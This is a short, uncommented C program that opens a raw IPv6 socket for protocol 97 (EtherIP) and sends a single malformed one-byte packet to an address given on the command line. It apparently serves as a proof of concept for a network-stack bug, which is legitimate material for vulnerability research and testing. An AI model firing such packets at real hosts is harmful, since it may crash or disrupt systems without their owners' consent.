#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main(int argc, char **argv) {
 if (argc < 2) {
   fprintf(stderr, "Usage: %s <dst>\n", argv[0]);
   exit(1);
 }

 int fd = socket(AF_INET6, SOCK_RAW, 97);

 if (fd < 0) {
   fprintf(stderr, "Can't open socket, are you root?\n");
   exit(1);
 }

 struct sockaddr_in6 dst_in6;
 memset(&dst_in6, 0, sizeof(dst_in6));
 dst_in6.sin6_family = AF_INET6;
 dst_in6.sin6_port = htons(97);
 inet_pton(AF_INET6, argv[1], &dst_in6.sin6_addr);

 sendto(fd, "\x03", 1, 0, (struct sockaddr *) &dst_in6, sizeof(dst_in6));
}
